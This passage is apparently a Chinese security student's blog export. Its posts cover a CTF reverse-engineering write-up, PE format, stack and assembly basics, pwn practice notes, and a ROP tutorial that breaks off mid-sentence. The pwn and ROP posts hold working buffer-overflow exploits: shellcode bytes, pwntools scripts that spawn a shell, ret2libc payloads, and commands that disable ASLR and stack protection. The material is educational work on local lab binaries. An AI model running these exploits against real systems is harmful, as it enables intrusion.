安卓（有所得）给的是一个smali文件，直接用smali2java编译成java语言看好了。 看看代码，大致流程和Base64没差，除了最后的对应转换表，将输入的以8位二进制转换，然后以6的倍数为条件补‘0’，最后6位为单位切片，在对应标志选择相应位置替代。 这样一来就可以逆向算法，一步一步已经写出了代码： end=&apos;xsZDluYYreJDyrpDpucZCo&apos; temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos; aa=[] bb=[] cc=[] str1=&apos;&apos; cnt=0 s=&apos;&apos; flag=&apos;&apos; for i in end: aa.append(temp.find(i)) for i in aa: bb.append(bin(i)[2:]) for i in range(len(bb)): while (len(bb[i]) != 6): bb[i] = &apos;0&apos; + bb[i] for i in bb: str1 += i for i in str1: s += i cnt += 1 if not cnt % 8: cc.append(s) s = &apos;&apos; for i in cc: flag+=chr(int(i,2)) print(&apos;flag= %s&apos; % (flag)) 上面都是一些简单的操作，所得何在，在于python的认知 int(str,’2/8/10/16’):这个可以将字符串转换为整型十进制，在这题的应用就在于将‘100101’转换为对应的十进制整形。 ‘’.split(‘’):可以将string按照相应的代表性质字符转换为列表例如：’10010101 11110000’.split(‘ ‘)==&gt;[‘10010101’,’11110000’] bin()转换之后得到的是一个str类型数据。 以上三点也许大牛看来很low，但毕竟是自己的积累。最后附上最终代码： w=[] mt=&apos;&apos; end=&apos;xsZDluYYreJDyrpDpucZCo&apos; temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos; for i in range(len(end)): w.append(temp.find(end[i])) m=&quot; &quot;.join([format(i,&apos;b&apos;) for i in w]) for j in m.split(&apos; &apos;): if len(j) != 6: mt+= &apos;0&apos; * (6 - len(j)) + j else: mt+=j m_change=mt[:-(len(mt)%8)] flag=&quot; &quot;.join(bin(int(x,2)) for x in [m_change[i:i+8] for i in range(0,len(m_change),8)]) print(&apos;&apos;.join([chr(i) for i in [int(b, 2) for b in flag.split(&apos; &apos;)]]))]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制文件基础]]></title>
    <url>%2F2017%2F07%2F07%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[堆栈大致了解之后，了解一下windows下的二进制文件。 PE文件格式 源代码被编译和链接之后形成了可执行文件。可执行文件之所以被操作系统加载运行，主要是因为他们有一个统一的格式规范。 PE（Portable Executable）是Win32下的可执行文件遵守的数据格式( 补充：Linux下的可执行文件一般是Elf的文件。)。常见的可执行文件（.exe .dll）都是典型的PE文件。 一个可执行文件不光光包含二进制文件的机器代码。还有字符串，菜单，图标，字体等一系列信息，PE文件格式规定了所有的这些信息在可执行文件中如何有规律的进行。所以说，要将一个可执行文件装入内存是一个非常难的事情。 PE文件格式把可执行文件分成若干个数据节，不同的资源呗存放在不同的节中，一个典型的PE文件包含的节如下： .text: 由编译器生成，存放二进制的机器代码，也是我们反汇编和调试的对象。 .data: 初始化的数据块，如宏定义、全局变量、静态变量等。 .idata：可执行文件链接的其他动态库中的有关外来函数以及信息。 .rsrc: 存放程序图标资源等。 如上图所示，那四类是比较常见的节，除此之外还可能出现的有“.reloc”,“.edata”,“.tls”,“.rdata”等。 加壳概念 加壳其实应该叫做可执行程序资源压缩，是保护文件不被随意修改的一种技术。但并不是表示被加壳的程序就不能进行运行，只是无法查询和修改源代码而已，只有脱完壳之后才可以查看源代码。 加壳其实就是利用特殊的算法对程序的代码和资源进行压缩，就好像我们用WINZIP对重要文件进行加密压缩一样，他只是在程序内部进行这样的操作而已。打一个比方，如果说程序是外套，源代码等资源是人的身体的话，那壳就是位于两者之间的一件衬衫。 现在也有许多的加壳工具，这些工具在文件头中会加入一段指令，告诉CPU如何才能解压自己，只是现在CPU处理速度都是秒秒钟的那种，所以加壳与不加壳的程序运行根本看不出什么不一样，除非你想了解源代码，你就会发现你被壳拒之门外。 加壳工具分为两种: 压缩壳:其特点主要是减小软件体积大小，加密保护并不是重点。 加密壳:其种类比较多，不同的壳侧重重点不同，一些壳单纯保护程序，另一些壳也提供注册、使用限制等功能。现如今需要付款使用的软件其实就是加了壳。 虚拟内存 Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中，物理内存非常复杂，需要进入Windows内核才可以看到。通常，在用户模式下，用调试器看到的都是虚拟内存。 用户启用程序使用的地址称之为虚拟地址和逻辑地址，其对应的存储空间称为虚拟内存和或逻辑地址空间。而计算机物理内存的访问地址则称为实地址和物理地址，其对应的存储空间称为物理存储空间或主存空间。程序进行虚拟地址到实地地址转换的过程叫做程序的再定位。 注:这里所说的内存是指Windows用户态内存映射机制下的虚拟内存，操作系统原理也有“虚拟内存”的概念存在，那是在实际物理内存不够时，有时候系统会把“部分硬盘空间”当作内存使用从而使得程序得到装载运行的现象，二者不能混淆。 PE文件与虚拟内存的映射 在调试漏洞时候通常要进行两部操作： 静态反汇编查看PE文件中某条指令的位置是相对于磁盘文件而言的，也就是需要知道文件偏移。 还需要知道这条指令在内存中的位置，也就是虚拟内存地址。 为此，我们需要弄清楚PE文件地址和虚拟内存地址之间的关系，首先了解几个重要的概念。 (1) 文件偏移地址（File Offset） 数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。 (2) 装载地址（Image Base） PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是0x00400000,DLL文件是0x10000000。这些位置可以通过修改编译选项进行更改。 (3) 虚拟内存地址（Virtual Address） PE文件中的指令被装入内存后的地址。 (4) 相对虚拟地址（Relative Virtual Address RVA） 相对虚拟地址是内存地址相对于映射基址的偏移量。虚拟内存地址、映射基址和相对虚拟内存地址三者之间有如下关系：VA = Image Base + RVA 在默认情况下，一般PE文件的0字节将映射到虚拟内存的0x00400000位置，这个地址就是所谓的装载基地址（Image Base）。如下图所示， 文件偏移是相对于文件开始处0字节的偏移，RVA则是相对于装载基地址0x00400000处的偏移。由于操作系统在进行装载时基本保持PE排列结果，所以文件偏移地址和RVA很大可能一致。 （如果有细微的差异的话，那就是由于文件数据的存放单位与内存数据存放单位不同造成的。) PE文件数据是按照磁盘数据标准存放，以0x200字节为基本单位进行组织，不足则以0x00填充，超过则分配下一个0X200继续使用 代码装入内存是按照内存数据存放，以0x1000字节为基本单位进行组织，不足全部补全，超过则分配下一个0x1000继续使用。 工具 Lord PE是一个查看PE文件并对之进行分析、修改的脱壳辅助软件。 如图就是这个工具的标准界面: 点击PE编辑器，随意加载如一个程序便可以查看相对信息： 点击区段进行节信息的查询：VOffset就是相对虚拟地址（RVA），ROffset是文件偏移地址。 在系统进程中，代码（.text节）将被加载到0x400000+0x11000=0x411000的虚拟地址中（装载基地址地址+RVA）。而在文件中，可以用二进制文件打开，看到对应的代码在0x10400位置。 通过这个工具可以很清楚了解我们所需要的信息（RVA，VA，文件偏移，装载基地址），对于漏洞的分析是一个很好的辅助。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆栈及汇编基础]]></title>
    <url>%2F2017%2F07%2F04%2F%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[暑假生活开始，学习的好时间，今天就先重温一下堆栈的基础，好好巩固一下。 内存区域 不同的操作系统，一个进程被分配进入的内存区域都会不同，但是无论是哪个系统，进程使用的内存按照功都同样大致分为四种： 代码区:这个区域储存装入的要被执行的二进制机器代码，处理器会到这个区域获取指令并进行执行。 数据区:这个区域储存程序运行过程中出现的全局变量，局部变量等。 堆区:进程需要运行的时候，可以向这个区域申请空间，当运行结束之后空间将归还堆区，这就是堆的特点，动态分配和回收空间。 栈区:用于动态存储函数之间的调用关系，从而保证调用函数后能回到主函数中继续执行程序。 Windows下高级语言写出一个程序经过编译链接之后便可以生成一个可执行文件，这个可执行文件被装载运行之后便成为了所谓的进程。 每一个可执行程序中都包含着二进制级别的机器代码，这些代码将会被装载入代码区，处理器会一条一条的读取并运行。如果代码中有开辟动态内存的请求，则会在内存堆区中分配一个大小适合的区域给代码使用；当函数调用发生之后，栈中便会有栈帧自动保存函数的调用关系信息，以便于函数调用结束能回到主函数继续执行程序。 栈帧:C语言中，栈中的栈帧对应着未运行完成的函数，并且是一一对应，栈帧从逻辑上理解就是一个函数执行的环境:函数的参数，函数的变量，函数的返回地址等。在函数栈帧中，一般包含如下几类重要信息。 局部变量:为函数局部变量开辟内存空间。 栈帧状态值:保存前栈帧的顶部和底部，用于在本栈弹出后可以恢复上一个栈帧。 函数返回地址:保存当前函数调用前的“断点”信息，也就是函数调用前的指令的位置，以便在函数返回时能回到调用的代码区中继续执行命令。 函数调用 假设一个如下的简单函数： int func_B(int a,int b) { int i,j; i = a + b; j = a - b; return i * j; } int func_A(int c,int d) { int t; t = func_B(c,d)+c; return t; } int main() { int main; main=func_A(4,3); return main; } 函数在进行函数调用在栈中的操作如下： 在main函数调用func_A的时候，首先在自己的栈帧中压入函数返回地址，然后为func_A创建新的栈帧并压入栈 在func_A调用func_B的时候，同样先在自己的栈帧中压入函数返回地址，然后为func_B创建新的栈帧并压入栈 在func_B返回时候，func_B专属的栈帧呗弹出统栈，这样就露出func_A的返回地址，这样就直接执行这个地址返回func_A中继续执行 在func_A返回时候，func_A专属的栈帧呗弹出统栈，这样就露出main的返回地址，这样就直接执行这个地址返回main中继续执行。 注意：在实际运行中，main函数并不是第一个被调用的函数，程序被装入内存前还有一些其他的操作。 函数调用本身的大体步骤如下：(这个对于后面pwn的学习中payload的构造有关键作用) 参数入栈：将参数从右向左依次压入系统栈中。 返回地址入栈：将当前代码去调用指令的下一条指令地址压入栈中，供函数返回时继续执行。 代码区跳转：处理器从当前代码区跳转到被调用的入口处。 栈帧调整：(1)保存当前栈帧的状态值，以备后面恢复本栈帧时使用（EBP入栈）。(2)将当前栈帧切换到新栈帧(将ESP值装入EBP，更新栈帧底部。) 汇编语言 在汇编语言当中，主要是四类寄存器。 4个数据寄存器（EAX，EBX，ECX，EDX）。 2个变址寄存器（ESI，EDI）、2个指针寄存器（ESP、EBP） 6个端寄存器（ES、CS、SS、DS、FS、GS） 1个指令指针寄存器（EIP）、一个标志寄存器（EFlags） 1.寄存器 (1). 数据寄存器 数据寄存器主要用来保存操作数以及运算结果，这样就便于节省读取操作数的时间。 32位CPU4个32位通用的寄存器EAX，EBX，ECX，EDX。他们只会对低16为数据进行存储，不会影响高16位的数据。这低16位的寄存器又被称为AX、BX、DC、CX。与先前的CPU寄存器相一致。 EAX：累加寄存器，用于加减乘除的操作，也用于存储函数的返回值。使用频率非常高。 EBX：基址寄存器，作为存储器指针来用。 ECX：计数寄存器，在循环和字符串操作时，用他来计数；在位操作是，要用CL来指明移位的位数。 EDX：数据寄存器，在进行乘除运算时，它可作为默认的操作数进行操作。 (2). 变址寄存器 32位CPU有两个32位通用的变址寄存器ESI和EDI，与前者一样，只对低16位数据进程存取。 ESI：在内存操作指令中作为源地址指针使用，处理字符串时候通常指向源串。 EDI：在内存操作指令中作为目的地址指针使用，处理字符串时候通常指向目标串。 (3). 指针寄存器EBP和ESP就是指针寄存器，主要用于存放堆栈内储存单元的偏移量，用他们可以实现多种寄存器储存操作数的寻址方式。 EBP: 基地址寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的底部。通过它减去一定偏移量对栈中元素进行访问。 ESP：栈指针寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的顶部。 (4). 段寄存器段寄存器是根据内存分段的模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问的较大物理空间的内存地址。 CS（Code）: 代码段寄存器，其值为代码段的段值 DS（Date）: 数据段寄存器，其值为数据段的段值 ES（Extra）: 附加段寄存器，其值为附加数据段的段值 SS（Strack）:堆栈段寄存器，其值为堆栈段的段值 FS（Flag）: 标志段寄存器，其值为附加数据段的段值 GS（Global）:全局段寄存器，其值为附加数据段的段值 8086 CPU依赖其内部的四个段寄存器实现寻址1M字节物理地址空间。8086把1M字节地址空间划分为若干逻辑段，当前使用段的段值存放在段寄存器中。由段寄存器和段内偏移形成20位地址。 汇编中表示： 段值：偏移 计算方法： 物理地址 = 段值×16 + 偏移 举个 用16进制表示的逻辑地址1234：3456H所对应的存储单元的物理地址为15796H。 (5). 指令指针寄存器 EIP：存放个下一次将要执行的指令在代码段中的偏移量。 (6). 标志寄存器8086 CPU中有一个16位的标志寄存器，包含了9个标志，主要用于反映处理器的状态和运算结果的某些特征。 9个标志寄存器可以分为两组，第一组6个标志寄存器主要受加减运算和逻辑运算结果的影响，称为运算结果标志，第二组标志不受运算结果的影响，称为状态控制标志。 1. 进位标志CF(Carry Flag) 进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 2. 奇偶标志PF(Parity Flag) 奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值1，否则其值为0 3. 辅助进位标志AF(Auxiliary Carry Flag) 在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： (1)、在字操作时，发生低字节向高字节进位或借位时； (2)、在字节操作时，发生低4位向高4位进位或借位时。 4. 零标志ZF(Zero Flag) 零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位 5. 符号标志SF(Sign Flag) 符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1 6. 溢出标志OF(Overflow Flag) 溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0（“溢出”和“进位”是两个不同含义的概念） 7. 中断允许标志IF(Interrupt-enable Flag) 中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下 (1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； (2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求 8. 追踪标志TF(Trap Flag) 当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 9. 方向标志DF(Direction Flag) 方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值 2. 主要指令 汇编中的指令可以参照这个网址进行学习（也涉及了上面的寄存器知识点）： http://www.freebuf.com/news/others/86147.html 在参加夏令营跟着读汇编呢也遇到了一些难以理解的内容： movsb：即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。 cld:（CLear Direction flag）则是清方向标志位，也就是使DF的值为0，在执行串操作时，使地址按递增的方式变化，这样便于调整相关段的的当前指针。这条指令与STD（SeT Direction flag）的执行结果相反，即置DF的值为1。 Rep:指令就是“重复”的意思，术语叫做“重复前缀指令”，因为既然是传递字符串，则不可能一个字（节）一个字（节）地传送，所以需要有一个寄存器来控制串长度。这个寄存器就是CX，指令每次执行前都会判断CX的值是否为0（为0结束重复，不为0，CX的值减1），以此来设定重复执行的次数。因此设置好CX的值之后就可以用REP MOVSB了。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>堆栈及汇编基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定一个小目标]]></title>
    <url>%2F2017%2F06%2F26%2F%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87%2F</url>
    <content type="text"><![CDATA[这是一个小目标。 今天，算是我的blog的第二个生日吧，在2016第一次搭建成功之后便在没有怎么管理过它，只是僵硬的往上传一些做题的writeup，那为什么还要搭建它，直接做一个笔记不就好了? 上周的聚会中和已经工作的学长作了一次深入的交谈，让我了解到了blog的重要，好好对待，它也许能助你成功，不好好对待它也就是一个高级一点的笔记本，恐怕也只有你自己能够进行阅读，毫无意义。 从前天开始对我的blog进行了主题修改，对一些小功能进行了完善，自行添加了一些小的插曲，自此，要求不高，多多上传一些自己的见解，把blog利用起来，学习之路还要继续向前。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8道Pwn基础练习所得]]></title>
    <url>%2F2017%2F02%2F09%2F8%E9%81%93Pwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E6%89%80%E5%BE%97%2F</url>
    <content type="text"><![CDATA[刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）{!:在数据填充的时候不可以用换行符号进行填充} 一、Pwn基础练习1查询pwn程序的c语言源代码 cat pwn.c 直接将64个A和一个B通过管道输入到程序中 python -c “print ‘A’*64+’B’” | ./pwn 二、Pwn基础练习2 Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。将AAA BBB CCC传给指定的test指令然后进行输出。（用户函数中没有获取函数值语句的程序当中） python -c “print ‘AAA BBB CCC’” | xargs ./test 以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节） x /4xb $esp+0x5C 三、Pwn基础练习3Python基础知识 Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。 运行脚本就可以把这题pwn成功 import os defpwn(): os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”) os.system(“./pwn3”) if name ==”main“: pwn() 在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。） export testenv=”Hello_World” Linux Shell中，可以使用$()或者两个反引号（）来包裹一条shell命令，并返回shell命令的执行结果。 比如执行export testenv2=python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。 export testenv2=python -c &quot;print &#39;A&#39;*20&quot; 四、Pwn基础练习4一、objdump使用 使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。 使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作 objdump -d pwn4 五、Pwn基础练习51、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左2、查询esp寄存器中的值 i r $esp 六、Pwn基础练习6二、Shellcode Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。 Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为： http://shell-storm.org/shellcode/ http://www.exploit-db.com/shellcode/ 具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）将pwn6.py 脚本写到test文件里面 然后把test文本拖到pwn6程序里面运行。 python pwn6.py test./pwn6 &lt; test shellcod的python脚本 shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”) print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode 七、Pwn基础练习7一、__builtin_return_address函数 builtin_return_address函数接收一个参数，可以是0,1,2等。builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址. 二、理解多层跳转 retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。 如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。 三、函数作用 fflush()用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为： int fflush(FILE* stream); 【参数】stream为文件指针。 【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。 fflush()也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。 stdin 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。 stdout 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。 八、Pwn基础练习8二、strdup函数 strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。 三、grep命令 当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。 我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。 对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，是正则表达式里面的通配符，如果要查找，需要使用反斜杠进行转移，即*。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一步一步学ROP之x86篇]]></title>
    <url>%2F2017%2F02%2F08%2F%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[根据寒假计划的第三计划，是该学习rop了。下面是学习rop之linux_x86篇的学习笔记以及总结。 语知其事，先解其意。rop是什么？ 一、ROP ROP的全称为Return-oriented programming（返回导向编程），这一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 了解了其意思，下面就是学习内容 第一、Control Flow Hijack 程序流劫持这是一个较为常见的程序流劫持，其宗旨就是栈溢出，格式化字符串攻击和栈溢出。通过这个手段，攻击者可以做的就是控制PC指针然后执行目标代码，想要应对这个攻击，在linux系统下也是有保护机制存在的： 1、DEP(堆栈不可执行)：这也就是gcc编译器gs验证码机制，这是专门防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。 此机制的关闭方法是：在gcc编译时采用-fno-stack-protector选项。 2、ASLR(内存地址随机化)：在Ubuntu个其他Linux内核的系统中，目前都采用的内存地址随机话机制，这将会使得猜测具体的内存地址变得十分困难。 此机制的关闭方法是：sysctl -w kernel.randomize_va_space=0 3、Stack Protector(栈保护)：对于Federal系统，默认会执行可执行程序的屏蔽保护机制，该机制不允许执行存储在栈中的代码，这会使得缓冲区溢出攻击变得无效。而Ubuntu系统中默认没有采用这种机制。 此机制的关闭方法是：sysctl –w kernel.exec-shield=0 gcc下：-z execstack 机制了解了下面来一个实际的操作，初学练习就要把保护机制全部关闭。就用书上所用到的这个例子好了。 根据大神的指引，初学先把Linux下的保护机制全部关闭，指令如下：这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。下面的指令就是关闭Linux系统的ASpapLR保护 关闭之后就先开始对这个程序进行分析。先在python下创建150个测试数据gdb的插件peda自带pattern脚本直接生成 然后开始run进行调试 可以看出来错误地址是0x41416d41 然后使用指令可以计算PC返回值覆盖点为140个字节，所以只要构造一个“A”*140+ret字符串就可以让PC执行我们所需要的指令 之后就是需要一段shellcod，获取方法很多，网上找现成的，msf自动生成，作为初学者，shellcode不好找，因为gdb调试的时候会影响buf在内存的地址根据大神指示，有一个好的方法:开启core dump这个功能 ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff029。 现在溢出点，shellcode和返回值地址都有。可以写exp了，最终测试代码如下: #!python #!/usr/bin/env python from pwn import * p = process(&apos;./test&apos;) ret = 0xbffff029 shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot; shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot; shellcode += &quot;\x0b\xcd\x80&quot; # p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) #对ret进行编码，将地址转换成内存中的二进制存储形式 payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret) p.send(payload) #发送payload p.interactive() #开启交互shell 接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下： socat TCP4-LISTEN:10001,fork EXEC:./test 随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。 因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！ 第二、Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护学习DEP就把DEP打开，其他两个（stack protector 和ASLR）依旧关闭开启DEP指令如下： gcc -fno-stack-protector -o test test.c 此时打开了DEP防护，那么如果还是提交上面那个脚本的话，系统会拒绝我们执行shellcode，现在的测试程序为rw，而上面确实rwx 我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。 $ gdb ./test2 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 …. (gdb) break main Breakpoint 1 at 0x8048430 (gdb) run Starting program: /home/mzheng/CTF/groupstudy/test/test2 Breakpoint 1, 0x08048430 in main () (gdb) print system $1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt; (gdb) print __libc_start_main $2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt; (gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到) 0xb7f81ff8 warning: Unable to access target memory at 0xb7fc8500, halting search. 1 pattern found. (gdb) x/s 0xb7f81ff8 0xb7f81ff8: &quot;/bin/sh&quot; 我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xb7e5f460以及”/bin/sh”的地址0xb7f81ff8。下面我们开始写exp： #!python #!/usr/bin/env python from pwn import * p = process(&apos;./level2&apos;) #p = remote(&apos;127.0.0.1&apos;,10002) ret = 0xdeadbeef systemaddr=0xb7e5f460 binshaddr=0xb7f81ff8 payload = &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr) p.send(payload) p.interactive() 第三、ROP– Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护下面打开ASLR保护，指令如下 sudo -s echo 2 /proc/sys/kernel/randomize_va_space 从现在开始会发现test的libc.so的地址每次都会变化。我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。首先我们利用objdump来查看可以利用的plt函数和函数对应的got表： 我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()[此函数用于确定动态库中函数地址]函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 